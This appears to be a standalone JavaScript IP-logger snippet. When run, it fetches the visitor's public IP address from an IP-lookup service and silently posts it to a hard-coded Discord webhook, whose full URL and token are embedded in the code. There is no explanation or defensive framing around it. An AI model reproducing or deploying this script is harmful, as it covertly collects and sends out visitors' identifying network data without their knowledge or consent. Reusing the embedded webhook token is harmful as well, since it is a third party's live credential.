var ip = '';
fetch('https://api.ipify.org/?format=json')
.then(function(response){
    return response.json();
})
.then(function(data){
    ip = data.ip;
    var webhook = 'https://discord.com/api/webhooks/1125070242104758335/atCaNQMhIKc12zd3ZuYniIgttmPqD3teME_lRoB083ou-yTs0BlUo20CzD5SCsAqhpUF';
    var message = {
        content: 'IP:' + ip
    };

    fetch(webhook, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(message)
    });
});